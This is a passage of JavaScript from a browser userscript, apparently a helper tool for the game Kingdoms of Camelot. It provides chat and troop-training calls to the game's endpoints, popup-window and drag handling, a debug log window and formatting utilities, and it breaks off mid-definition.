function updatebotbutton(text, id){
var but=document.getElementById(id);
but.innerHTML = '<span style="color: #fff">'+text+'</span>';
}
function reloadKOC (){
  var serverId = getServerId();
  if(serverId == '??') window.location.reload(true);
  var goto = window.location.protocol+'//apps.facebook.com/kingdomsofcamelot/?s='+serverId;
  if(document.URL.match(/standalone=1/i)){
	goto = window.location.protocol+'//www.kabam.com/kingdoms-of-camelot/play?s='+serverId;
  }
  var t = '<FORM target="_top" action="'+ goto +'" method=post><INPUT id=xxpbButReload type=submit value=RELOAD><INPUT type=hidden name=s value="'+ serverId +'"</form>';
  var e = document.createElement ('div');
  e.innerHTML = t;
  document.body.appendChild (e);
  setTimeout (function (){document.getElementById('xxpbButReload').click();}, 0);
}
function htmlSelector (valNameObj, curVal, tags){
  var m = [];
  m.push ('<SELECT');
  if (tags){
    m.push (' ');
    m.push (tags);
  }
  for (var k in valNameObj){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameObj[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');
}

function cityStatusString (cs){
  if (cs==4)
    return ''+culang.vacation+'';
  if (cs==3)
    return ''+culang.truce+'';
  if (cs==2)
    return ''+culang.begProtection+'';
  return ''+culang.OwideOptnormal+'';
}

function sendChat (msg){
  document.getElementById ("mod_comm_input").value = msg;
  unsafeWindow.Chat.sendChat ();
}
Chat = {
  params : null,

  sendWhisper : function (msg, who, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 3;
    this.params.name = who;
    this._sendit (msg, notify);
  },

  sendGlobal : function (msg, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 1;
    this._sendit (msg, notify);
  },

  sendAlliance : function (msg, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 2;
    this._sendit (msg, notify);
  },

  _sendit : function (msg, notify){
    function strip(s) {
       return s.replace(/^\s+/, '').replace(/\s+$/, '');
    }
    this.params.comment = strip (msg);
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/sendChat.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: this.params,
      onSuccess: function(transport) {
        if (notify)
          notify ();
      },
      onFailure: function(transport) {
        if (notify)
          notify ();
      }
    });
  },
}

function doDefTrain (cityId, unitId, num, notify){
  var time = unsafeWindow.modal_walls_traintime(unitId, num);
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  params.cid = cityId;
  params.type = unitId;
  params.quant = num;
  params.items = 0;
  
  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/fortify.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (rslt.ok) {
          unsafeWindow.seed.queue_fort["city" + cityId].push([unitId, num, rslt.initTS, parseInt(rslt.initTS) + time, 0, time, rslt.fortifyId]);
          if (notify != null)
            setTimeout (function (){notify(null);}, 500);
        } else {
          if (notify != null)
            setTimeout (function (){notify(rslt.errorMsg);}, 500);
        }
      },
      onFailure: function () {
        if (notify != null)
          notify(rslt.errorMsg);
      },
  });
}
function doTrain (cityId, tut, gamble, unitId, num, notify){
  var time = unsafeWindow.modal_barracks_traintime(unitId, num);
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  params.cid = cityId;
  params.type = unitId;
  params.quant = num;
  params.items = tut;
  params.gambleId = gamble;
  
  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/train.php" + unsafeWindow.g_ajaxsuffix, {
    method: "post",
    parameters: params,
    onSuccess: function(rslt) {
      if (rslt.ok) {
        for (var i = 1; i < 5; i++) {
		  var resourceLost = parseInt(unsafeWindow.unitcost["unt" + unitId][i]) * 3600 * parseInt(num);
		  if(rslt.gamble) resourceLost = resourceLost*rslt.gamble[i];
          unsafeWindow.seed.resources["city" + cityId]["rec" + i][0] = parseInt(unsafeWindow.seed.resources["city" + cityId]["rec" + i][0]) - resourceLost;
        }
        unsafeWindow.seed.citystats["city" + cityId].gold[0] = parseInt(unsafeWindow.seed.citystats["city" + cityId].gold[0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][5]) * parseInt(num);
        unsafeWindow.seed.citystats["city" + cityId].pop[0] = parseInt(unsafeWindow.seed.citystats["city" + cityId].pop[0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][6]) * parseInt(num);
        unsafeWindow.seed.queue_unt["city" + cityId].push([unitId, num, rslt.initTS, parseInt(rslt.initTS) + time, 0, time, null]);
        if (notify != null)
          setTimeout (function (){notify(null);}, 500);
      } else {
        if (notify != null){
          setTimeout (function (){notify(rslt.errorMsg);}, 500);
        }
      }
    },
    onFailure: function(o) {
      if (notify != null)
        notify(rslt.errorMsg);
    }
  });
}
function getAbsoluteOffsets (e){
  ret = {left:0, top:0};
  while (e.offsetParent){
    if (e.style.position == 'absolute')
      break;
    ret.left += e.offsetLeft;
    ret.top += e.offsetTop;
    e = e.offsetParent;
  }
  return ret;
}

DebugTimer = {
  startTime : 0,
  start : function (){
    now = new Date();
    DebugTimer.startTime = now.getTime();
  },
  getMillis : function (){
    now = new Date();
    return now.getTime() - DebugTimer.startTime;
  },
  display : function (label, noReset){
    now = new Date();
    elapsed = now.getTime() - DebugTimer.startTime;
    logit (label +": "+ elapsed/1000);
    if (noReset===null || !noReset)
      DebugTimer.startTime = now.getTime();
  },
};

function debugPos  (e){
  return '['+ e.tagName +'] client - offset: '+ e.clientLeft +','+ e.clientTop +','+ e.clientWidth +','+ e.clientHeight
          +' - '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' '+ e +' --OP--> '+ e.offsetParent;
}

function CwaitForElement (id, timeout, notify){
  this.check = check;
  this.end = new Date().getTime() + timeout;
  var t = this;
  this.check();
  function check(){
    if (document.getElementById (id))
      notify (true);
    else if (new Date().getTime() > t.end)
      notify (false);
    else
      setTimeout (t.check, 250);
  }
}
function clickWin (win,obj,evtName) {
  var evt = win.document.createEvent("MouseEvents");
  evt.initMouseEvent(evtName, true, true, win, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
  return !obj.dispatchEvent(evt);
}
function debugElement  (e){
  var x = unsafeWindow.Object.clone (e.wrappedJSObject);
  x.innerHTML = '';
  x.innerText = '';
  x.textContent = '';
  return inspect (x, 1, 1);
}
function searchDOM (node, condition, maxLevel, doMult){
  var found = [];
  eval ('var compFunc = function (node) { return ('+ condition +') }');
  doOne(node, 1);
  if(!doMult){
    if (found.length==0)
      return null;
    return found[0];
  }
  return found;
  function doOne (node, curLevel){
    try {
      if (compFunc(node))
        found.push(node);
    } catch (e){
    }
    if (!doMult && found.length>0)
      return;
    if (++curLevel<maxLevel && node.childNodes!=undefined)
      for (var c=0; c<node.childNodes.length; c++)
        doOne (node.childNodes[c], curLevel);
  }
}

function getClientCoords(e){
  if (e==null)
    return {x:null, y:null, width:null, height:null};
  var x=0, y=0;
  ret = {x:0, y:0, width:e.clientWidth, height:e.clientHeight};
  while (e.offsetParent != null){
    ret.x += e.offsetLeft;
    ret.y += e.offsetTop;
    e = e.offsetParent;
  }
  return ret;
}
function DOMtree (e, levels){
  var m = [];
  level (e, levels, 0);

  function level (e, levels, cur){
    try {
      for (var i=0; i<cur; i++)
        m.push('  ');
      if (!e.tagName)
        m.push ('?');
      else
        m.push (e.tagName);
      if (e.id){
        m.push (' id=');
        m.push (e.id);
      }
      if (e.name){
        m.push (' name=');
        m.push (e.name);
      }
      if (e.className){
        m.push (' class=');
        m.push (e.className);
      }
      if (e.style && e.style.display && e.style.display.indexOf('none')>0)
        m.push (' hidden');
       m.push ('\n');
      if (cur < levels){
        for (var c=0; c<e.childNodes.length; c++){
          level (e.childNodes[c], levels, cur+1);
        }
      }
    } catch (e) {
      m.push ('UNAVAILBLE!\n');
    }
  }
  return m.join('');
}
function parseIntNan (n){
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x;
}
function parseIntCommas (n){
  n = n.split(',');
  n = n.join('');
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x;
}
function parseIntZero (n){
  n = n.trim();
  if (n == '')
    return 0;
  return parseInt(n, 10);
}
function getFirefoxVersion (){
  var ver='', i;
  var ua = navigator.userAgent;
  if (ua==null || (i = ua.indexOf('Firefox/'))<0)
    return;
  return ua.substr(i+8);
}
function htmlTitleLine (msg){
  return '<TABLE width=100% cellspacing=0><TR><TD style="padding:0px" width=50%><HR></td><TD style="padding:0px">[ '+ msg +' ]</td><TD style="padding:0px" width=50%><HR></td></tr></table>';
}
var WinManager = {
  wins : {},    // prefix : CPopup obj
  didHide : [],
  get : function (prefix){
    var t = WinManager;
    return t.wins[prefix];
  },

  add : function (prefix, pop){
    var t = WinManager;
    t.wins[prefix] = pop;
    if (unsafeWindow.cpopupWins == null)
      unsafeWindow.cpopupWins = {};
    unsafeWindow.cpopupWins[prefix] = pop;
  },

  hideAll : function (){
    var t = WinManager;
    t.didHide = [];
    for (k in t.wins){
      if (t.wins[k].isShown()){
        t.didHide.push (t.wins[k]);
        t.wins[k].show (false);
      }
    }
  },
  restoreAll : function (){
    var t = WinManager;
    for (var i=0; i<t.didHide.length; i++)
      t.didHide[i].show (true);
  },

  delete : function (prefix){
    var t = WinManager;
    delete t.wins[prefix];
    delete unsafeWindow.cpopupWins[prefix];
  }
}
function CPopup (prefix, x, y, width, height, enableDrag, onClose) {
  var pop = WinManager.get(prefix);
  if (pop){
    pop.show (false);
    return pop;
  }
  this.BASE_ZINDEX = 111111;
  this.show = show;
  this.toggleHide = toggleHide;
  this.getTopDiv = getTopDiv;
  this.getMainTopDiv = getMainTopDiv;
  this.getMainDiv = getMainDiv;
  this.getLayer = getLayer;
  this.setLayer = setLayer;
  this.setEnableDrag = setEnableDrag;
  this.getLocation = getLocation;
  this.setLocation = setLocation;
  this.focusMe = focusMe;
  this.isShown = isShown;
  this.unfocusMe = unfocusMe;
  this.centerMe = centerMe;
  this.destroy = destroy;
  this.autoHeight = autoHeight;

  this.div = document.createElement('div');
  this.prefix = prefix;
  this.onClose = onClose;
  var t = this;
  this.div.className = 'CPopup '+ prefix +'_CPopup';
  this.div.id = prefix +'_outer';
  this.div.style.background = 'url(http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowermultilangTop.png) no-repeat #141516'; 
  this.div.style.zIndex = this.BASE_ZINDEX        // KOC modal is 100210 ?
  this.div.style.display = 'none';
  this.div.style.width = width + 'px';
  this.div.style.height = height + 'px';
  this.div.style.maxHeight = height + 'px';
  this.div.style.overflowY = 'show';
  this.div.style.position = "absolute";
  this.div.style.top = y +'px';
  this.div.style.left = x + 'px';

  if (CPopUpTopClass==null)
    topClass = 'CPopupTop '+ prefix +'_CPopupTop';
  else
    topClass = CPopUpTopClass +' '+ prefix +'_'+ CPopUpTopClass;

var m = '<TABLE cellspacing=0 ><TR id="'+ prefix +'_bar" class="'+ topClass +'" ><div valign=bottom class=enablePDXMenu>';
m += '<input src="http://koc-power-pdx.googlecode.com/svn/trunk/img/plusMenu.png" title="'+culang.showMenuBar+'" alt="'+culang.buttonon+'" type="image" value="'+culang.buttonon+'" onclick="if(document.getElementById(\'pb_top\').style.display=\'none\'){document.getElementById(\'pb_top\').style.display=\'block\'}else{document.getElementById(\'pb_top\').style.display=\'none\'}">';
m += '</div>';
m += '<TD width=100% style="background:none; border:none;" valign=bottom><SPAN id="'+ prefix +'_top" ></span></td>\
      <TD id='+ prefix +'_X align=right valign=middle onmouseover="this.style.cursor=\'pointer\'" style="width: 30px; margin-left: 715px; height:25px; border:none; background:transparent;"><img style="margin-bottom:5px;" width=25px height=25px src=http://koc-power-pdx.googlecode.com/svn/trunk/img/close.png title="'+culang.close+'"></td></tr>\
      <TR><TD height=100% width=100%  valign=top class="CPopMain '+ prefix +'_CPopMain" colspan=2 id="'+ prefix +'_main"></td></tr></table>';

  document.body.appendChild(this.div);
  this.div.innerHTML = m;
  document.getElementById(prefix+'_X').addEventListener ('click', e_XClose, false);
  this.dragger = new CWinDrag (document.getElementById(prefix+'_bar'), this.div, enableDrag);

  this.div.addEventListener ('mousedown', e_divClicked, false);
  WinManager.add(prefix, this);

  function e_divClicked (){
    t.focusMe();
  }
  function e_XClose (){
    t.show(false);
    if (t.onClose != null)
      t.onClose();
  }
  function autoHeight (onoff){
    if (onoff)
      t.div.style.height = '';
    else
      t.div.style.height = t.div.style.maxHeight;
  }
  function focusMe (){
    t.setLayer(5);
    for (k in unsafeWindow.cpopupWins){
      if (k != t.prefix)
        unsafeWindow.cpopupWins[k].unfocusMe();
    }
  }
  function unfocusMe (){
    t.setLayer(-5);
  }
  function getLocation (){
    return {x: parseInt(this.div.style.left), y: parseInt(this.div.style.top)};
  }
  function setLocation (loc){
    t.div.style.left = loc.x +'px';
    t.div.style.top = loc.y +'px';
  }
  function destroy (){
    document.body.removeChild(t.div);
    WinManager.delete (t.prefix);
  }
  function centerMe (parent){
    if (parent == null){
      var coords = getClientCoords(document.body);
    } else
      var coords = getClientCoords(parent);
    var x = ((coords.width - parseInt(t.div.style.width)) / 2) + coords.x;
    var y = ((coords.height - parseInt(t.div.style.height)) / 2) + coords.y;
    if (x<0)
      x = 0;
    if (y<0)
      y = 0;
    t.div.style.left = x +'px';
    t.div.style.top = y +'px';
  }
  function setEnableDrag (tf){
    t.dragger.setEnable(tf);
  }
  function setLayer(zi){
    t.div.style.zIndex = ''+ (this.BASE_ZINDEX + zi);
  }
  function getLayer(){
    return parseInt(t.div.style.zIndex) - this.BASE_ZINDEX;
  }
  function getTopDiv(){
    return document.getElementById(this.prefix+'_top');
  }
  function getMainTopDiv(){
    return document.getElementById(this.prefix+'_top');
  }
  function getMainDiv(){
    return document.getElementById(this.prefix+'_main');
  }
  function isShown (){
    return t.div.style.display == 'block';
  }
  function show(tf){
    if (tf){
      t.div.style.display = 'block';
      t.focusMe ();
    } else {
      t.div.style.display = 'none';
    }
    return tf;
  }
  function toggleHide(t){
    if (t.div.style.display == 'block') {
      return t.show (false);
    } else {
      return t.show (true);
    }
  }
}
function CWinDrag (clickableElement, movingDiv, enabled) {
  var t=this;
  this.setEnable = setEnable;
  this.setBoundRect = setBoundRect;
  this.debug = debug;
  this.dispEvent = dispEvent;
  this.lastX = null;
  this.lastY = null;
  this.enabled = true;
  this.moving = false;
  this.theDiv = movingDiv;
  this.body = document.body;
  this.ce = clickableElement;
  this.moveHandler = new CeventMove(this).handler;
  this.outHandler = new CeventOut(this).handler;
  this.upHandler = new CeventUp(this).handler;
  this.downHandler = new CeventDown(this).handler;
  this.clickableRect = null;
  this.boundRect = null;
  this.bounds = null;
  this.enabled = false;
  if (enabled == null)
    enabled = true;
  this.setEnable (enabled);

  function setBoundRect (b){    // this rect (client coords) will not go outside of current body
    this.boundRect = boundRect;
    this.bounds = null;
  }
  function setEnable (enable){
    if (enable == t.enabled)
      return;
    if (enable){
      clickableElement.addEventListener('mousedown',  t.downHandler, false);
      t.body.addEventListener('mouseup', t.upHandler, false);
    } else {
      clickableElement.removeEventListener('mousedown', t.downHandler, false);
      t.body.removeEventListener('mouseup', t.upHandler, false);
    }
    t.enabled = enable;
  }
  function CeventDown (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.bounds == null){

        t.clickableRect = getClientCoords(clickableElement);
        t.bodyRect = getClientCoords(document.body);
        if (t.boundRect == null)
          t.boundRect = t.clickableRect;
        t.bounds = {top:10-t.clickableRect.height, bot:t.bodyRect.height-25, left:40-t.clickableRect.width, right:t.bodyRect.width-25};
      }
      if (me.button==0 && t.enabled){
        t.body.addEventListener('mousemove', t.moveHandler, true);
        t.body.addEventListener('mouseout', t.outHandler, true);
        t.lastX = me.clientX;
        t.lastY = me.clientY;
        t.moving = true;
      }
    }
  }
  function CeventUp  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0 && t.moving)
        _doneMoving(t);
    }
  }
  function _doneMoving (t){
    t.body.removeEventListener('mousemove', t.moveHandler, true);
    t.body.removeEventListener('mouseout', t.outHandler, true);
    t.moving = false;
  }

  function CeventOut  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0){
        t.moveHandler (me);
      }
    }
  }
  function CeventMove (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.enabled && !t.wentOut){
        var newTop = parseInt(t.theDiv.style.top) + me.clientY - t.lastY;
        var newLeft = parseInt(t.theDiv.style.left) + me.clientX - t.lastX;
        if (newTop < t.bounds.top){     // if out-of-bounds...
          newTop = t.bounds.top;
          _doneMoving(t);
        } else if (newLeft < t.bounds.left){
          newLeft = t.bounds.left;
          _doneMoving(t);
        } else if (newLeft > t.bounds.right){
          newLeft = t.bounds.right;
          _doneMoving(t);
        } else if (newTop > t.bounds.bot){
          newTop = t.bounds.bot;
          _doneMoving(t);
        }
        t.theDiv.style.top = newTop + 'px';
        t.theDiv.style.left = newLeft + 'px';
        t.lastX = me.clientX;
        t.lastY = me.clientY;
      }
    }
  }

  function debug  (msg, e){
    logit ("*************** "+ msg +" ****************");
    logit ('clientWidth, Height: '+ e.clientWidth +','+ e.clientHeight);
    logit ('offsetLeft, Top, Width, Height (parent): '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' ('+ e.offsetParent +')');
    logit ('scrollLeft, Top, Width, Height: '+ e.scrollLeft +','+ e.scrollTop +','+ e.scrollWidth +','+ e.scrollHeight);
  }

  function dispEvent (msg, me){
    logit (msg + ' Button:'+ me.button +' Screen:'+ me.screenX +','+ me.screenY +' client:'+  me.clientX +','+ me.clientY +' rTarget: '+ me.relatedTarget);
  }
}
function inspect(obj, maxLevels, level, doFunctions){
  var str = '', type, msg;
  if(level == null)  level = 0;
  if(maxLevels == null) maxLevels = 1;
  if(maxLevels < 1)
      return 'Inspect Error: Levels number must be > 0';
  if(obj == null)
    return ''+culang.Herror+': Object is NULL\n';
  var indent = '';
  for (var i=0; i<level; i++)
    indent += '  ';
  for(property in obj) {
    try {
        type =  matTypeof(obj[property]);
        if (doFunctions==true && (type == 'function')){
          str += indent + '(' + type + ') ' + property + "[FUNCTION]\n";
        } else if (type != 'function') {
          str += indent + '(' + type + ') ' + property + ( (obj[property]==null)?(': null'):('')) +' = '+ obj[property] +"\n";
        }
        if((type=='object' || type=='array') && (obj[property] != null) && (level+1 < maxLevels))
          str += inspect(obj[property], maxLevels, level+1, doFunctions);  // recurse
    }
    catch(err) {
      // Is there some properties in obj we can't access? Print it red.
      if(typeof(err) == 'string') msg = err;
      else if(err.message)        msg = err.message;
      else if(err.description)    msg = err.description;
      else                        msg = 'Unknown';
      str += '(Error) ' + property + ': ' + msg +"\n";
    }
  }
  str += "\n";
  return str;
}
Array.prototype.compare = function(testArr) {
    if (this.length != testArr.length) return false;
    for (var i = 0; i < testArr.length; i++) {
        if (this[i].compare) {
            if (!this[i].compare(testArr[i])) return false;
        }
        if (this[i] !== testArr[i]) return false;
    }
    return true;
}
String.prototype.StripQuotes = function() {
return this.replace(/"/g,'');
}
// String.prototype.entityTrans = { '&agrave;':'\\u00e0', '&eacute;':'\\u00e9', '&':'&amp;', '<':'&lt;',  '>':'&gt;',  '\"':'&quot;', '\'':'&#039', '<':'\\u003c', '/':'\\/', '\\':'\\\\', '\"':'\\\"'};
String.prototype.entityTrans = { '&':'&amp;', '<':'&lt;',  '>':'&gt;',  '\"':'&quot;', '\'':'&#039', '<':'\\u003c', '/':'\\/', '\\':'\\\\', '\"':'\\\"'};

String.prototype.htmlSpecialChars = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret  = ret.split(k).join(this.entityTrans[k]);
  return ret;
}
String.prototype.htmlSpecialCharsDecode = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret = ret.split(this.entityTrans[k]).join(k);
  return ret;
}
String.prototype.stripTags = function(){
  return this.replace(/<\w+(\s+("[^"]*"|'[^']*'|[^>])+)?>|<\/\w+>/gi, '');
}
String.prototype.trim = function () {
    return this.replace(/^\s*/, "").replace(/\s*$/, "");
}
String.prototype.capitalize = function(){
  return this.charAt(0).toUpperCase() + this.substring(1).toLowerCase();
}
function objectName (o){
  var s = o.toString();
  return s.substr(7,s.length-8);
}
function tbodyScroller (tbody, maxHeight){
  tbody.style.maxHeight = '';
  tbody.style.height = '';
  tbody.style.overflowX = 'hidden';
  if (parseInt(tbody.clientHeight) > maxHeight){
    tbody.style.height = maxHeight + 'px';
    tbody.style.maxHeight = maxHeight + 'px';
    tbody.style.overflowY = 'auto';
  }
}
function getRemainingHeight (e, myDiv){
  var ec = getClientCoords(e);
  var cc = getClientCoords(myDiv);
  return myDiv.clientHeight - (ec.y - cc.y);
}
function addCommasInt(n){
  nStr = parseInt(n) + '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(nStr)) {
    nStr = nStr.replace(rgx, '$1' + ',' + '$2');
  }
  return nStr;
}
function addCommas(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1 + x2;
}
function thouormil(value){
  if (value==0)
    return 0;
  else if ((value%1000000)==0)
    return addCommas(value/1000000)+'m';
  else if ((value%1000)==0)
    return addCommas(value/1000)+'k';
  else
    return addCommas(value);
}
function addCommasWhole(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1;
}
function htmlSelector (valNameArray, curVal, tags){
  m = [];
  m.push ('<SELECT');
  if (tags){
    m.push (' ');
    m.push (tags);
  }
  for (k in valNameArray){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameArray[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');

}
function getRallyPointLevel(cityID, returnLogicalLevel) {
  var RallypointLevel = 0;
  for (var o in Seed.buildings[cityID]){
    if (parseInt(Seed.buildings[cityID][o][0]) == 12){
      RallypointLevel=parseInt(Seed.buildings[cityID][o][1]);
      break;
    }
  }
  if (returnLogicalLevel && RallypointLevel == 11)
    RallypointLevel = 15;
  return RallypointLevel;
}
function unixTime (){
  return parseInt (new Date().getTime() / 1000) + unsafeWindow.g_timeoff;
}
function htmlOptions (a, curVal){
  m = '';
  for (k in a)
    m += '<OPTION value="'+ k +'"'+ (k==curVal?' SELECTED':'')  +'>'+ a[k] +'</option>';
  return m;
}
function getFunctionName (func){
  var name=/\W*function\s+([\w\$]+)\(/.exec(func);
  if (!name)
    return '';
  return name[1];
}
function findAllBetween (txt, find1, find2){
  var m = [];
  var last = 0;
  while ( (i1=txt.indexOf(find1, last))>=0 && (i2=txt.indexOf (find2, i1))>=0 ) {
    m.push (txt.substring(i1+find1.length, i2));
    last = i2 + find2.length;
  }
  return m;
}
function strUpTo (s, find){
  var i = s.indexOf(find);
  if (i > 0)
    return s.substr(0, i);
  return s;
}
function timestrShort(time) {
  time = parseInt (time);
  if (time > 86400){
    var m = [];
    time /= 3600;
    m.push (parseInt(time/24));
    m.push (''+culang.shrDays+' ');
    m.push (parseInt(time%24));
    m.push (''+culang.shrHour+' ');
    return m.join ('');
  } else
    return timestr (time);
}
function timestr(time, full) {
  time = parseInt (time);
  var m = [];
  var t = time;
  if (t < 61)
    return  t + ''+culang.shrSec+'';
  if (t > 86400){
    m.push (parseInt(t/86400));
    m.push (''+culang.shrDays+' ');
    t %= 86400;
  }
  if (t>3600 || time>3600){
    m.push (parseInt(t/3600));
    m.push (''+culang.shrHour+' ');
    t %= 3600;
  }
  m.push (parseInt(t/60));
  m.push (''+culang.shrMin+' ');
  if (full || time<=3600 ){
    m.push (' ');
    m.push (t%60);
    m.push (''+culang.shrSec+'');
  }
  return m.join ('');
}
function helpFriends() {
  function findFb (){
	var kocForm = document.getElementById('claimhelpform');
	if (!kocForm){
	  setTimeout (findFb, 1000);
	}
	kocForm.submit();
  }	 
 findFb();
}
function entier_1dec (nombre){
	if (parseInt(nombre*10)!=0){
		return parseInt(nombre*10)/10;
	} else {
	return nombre;
	}	
}
function timestrcolon(time) {
	seconds = parseInt (time);
	var t, u;
	var secs86400 = seconds % 86400;
	var numhours = Math.floor(secs86400 / 3600);
	t = '00' + numhours;
	t = t.substr(t.length-2,2) + ':';
	var numminutes = Math.floor((secs86400 % 3600) / 60);
	u = '00' + numminutes;
	t += u.substr(u.length-2,2) + ':';
	var numseconds = (secs86400 % 3600) % 60;
	u = '00' + numseconds;
	t += u.substr(u.length-2,2);
	return t;
}
var WINLOG_MAX_ENTRIES = 1000;     // TODO

var WinLog = {
	state : null,
	win: null,
	eOut : null,
	lastE : null,
	enabled : true,
	reverse : true,
	busy : false,
	isOpening : false,

  open : function (){
    var t = WinLog;

    function eventButClear(){
      var t = WinLog;
      t.lastE = null;
      t.eOut.innerHTML ='';
    }
    function eventButReverse(){
      var t = WinLog;
      if (t.busy)
        return;
      t.busy = true;
      if (t.reverse){
        t.win.document.getElementById('wlRev').value= 'Top';
        t.reverse = false;
      } else{
        t.win.document.getElementById('wlRev').value= 'Bottom';
        t.reverse = true;
      }
      var n = t.eOut.childNodes.length;
      if (n < 2)
        return;
      for (i=n-2; i>=0; i--){
        t.eOut.appendChild (t.eOut.childNodes[i]);
      }
      t.busy = false;
    }
    if (!t.win || t.win.closed){
	t.isOpening = true;
	t.win = window.open('', 'uwtrace', 'top=30,left=0,width=900,height=700,scrollbars=no,location=no,menubar=no,directories=no,status=no');
	t.isOpening = false;
	t.state = null;
    }
    if (t.state == null){
      t.win.document.body.innerHTML = '<STYLE>pre{margin:0px} hr{margin:3px; height:1px; border:0px; color:#cee; background-color:#cee}</style><BODY style="margin:0px; padding:0px; border:none"><DIV id=winlogtop style="background-color:#d0d0d0; margin:0px; padding:0px; border:1px solid"><INPUT id=wlClear type=submit value="Clear"> &nbsp; <INPUT id=wlRev type=submit value="Bottom"></div><DIV id=wlOut style="overflow-y:auto; height:100%; max-height:100%"></div></body>';
      t.win.document.getElementById('wlClear').addEventListener('click', eventButClear, false);
      t.win.document.getElementById('wlRev').addEventListener('click', eventButReverse, false);
      t.eOut =  t.win.document.getElementById('wlOut');
      t.lastE = null;
      t.state = 1;
    }
  },
  writeText : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.write (msg.htmlSpecialChars());
  },
  write : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.open();
    var te = document.createElement('pre');
    var now = new Date();
    var m = [];
    var millis = now.getMilliseconds();
    m.push (now.toTimeString().substring (0,8));
    m.push ('.');
    if (millis<100)
      m.push('0');
    if (millis<10)
      m.push('0');
    m.push(millis);
    m.push (': ');
    m.push (msg);
    te.innerHTML = m.join('');
    if (t.reverse){
      if (t.lastE == null){
        t.eOut.appendChild(te);
        t.lastE = te;
      } else {
        t.eOut.insertBefore(te, t.lastE);
      }
      var hr = document.createElement('hr');
      t.eOut.insertBefore(hr, te);
      t.lastE = hr;
    } else {
      t.eOut.appendChild(te);
      t.eOut.appendChild(document.createElement('hr'));
    }
  },

};

function getMarchInfo (){
  var ret = {};
  ret.marchUnits = [];
  ret.returnUnits = [];
  ret.resources = [];
  for (i=0; i<13; i++){
    ret.marchUnits[i] = 0;
    ret.returnUnits[i] = 0;
  }
  for (i=0; i<6; i++){
    ret.resources[i] = 0;
  }
  var now = unixTime();
  for(i=0; i<Cities.numCities; i++) {   // each city
    cityID = 'city'+ Cities.cities[i].id;
    for (k in Seed.queue_atkp[cityID]){   // each march
      march = Seed.queue_atkp[cityID][k];
      if (typeof (march) == 'object'){
        for (ii=0; ii<13; ii++){
          ret.marchUnits[ii] += parseInt (march['unit'+ ii +'Count']);
          ret.returnUnits[ii] += parseInt (march['unit'+ ii +'Return']);
        }
        for (ii=1; ii<5; ii++){
          ret.resources[ii] += parseInt (march['resource'+ ii]);
        }
          ret.resources[0] += parseInt (march['gold']);
      }
    }
  }
  return ret;
}

function getMarchInfo2 (cityID){
  var ret = {};
 ret.marchUnits = [];
 ret.returnUnits = [];
 ret.resources = [];
  for (i=0; i<13; i++){
    ret.marchUnits[i] = 0;
    ret.returnUnits[i] = 0;
  }
  for (i=0; i<6; i++){
   ret.resources[i] = 0;
  }
for (k in Seed.queue_atkp[cityID]){   // each march
      march = Seed.queue_atkp[cityID][k];
if(march.marchType != 5){
 if (typeof (march) == 'object'){
for (ii=0; ii<13; ii++){
ret.marchUnits[ii] += parseInt (march['unit'+ ii +'Count']);
ret.returnUnits[ii] += parseInt (march['unit'+ ii +'Return']);
}
for (ii=1; ii<5; ii++){
 ret.resources[ii] += parseInt (march['resource'+ ii]);
}
 ret.resources[0] += parseInt (march['gold']);
}
}
}
  return ret;
}

function ShowExtraInfo(){
	document.getElementById('kocmain_bottom').innerHTML = 'test'; 
}
var WarnZeroAttack = {
  modalAttackFunc : null,

  init : function (){
    var t = WarnZeroAttack;
    t.modalAttackFunc = new CalterUwFunc ('modal_attack', [['modal_attack_check()', 'modalAttack_hook()']]);
    unsafeWindow.modalAttack_hook = t.hook;
    t.modalAttackFunc.setEnable(Options.fixWarnZero);
  },

  setEnable : function (tf){
    var t = WarnZeroAttack;
    t.modalAttackFunc.setEnable (tf);
  },

  isAvailable : function (){
    var t = WarnZeroAttack;
    return t.modalAttackFunc.isAvailable();
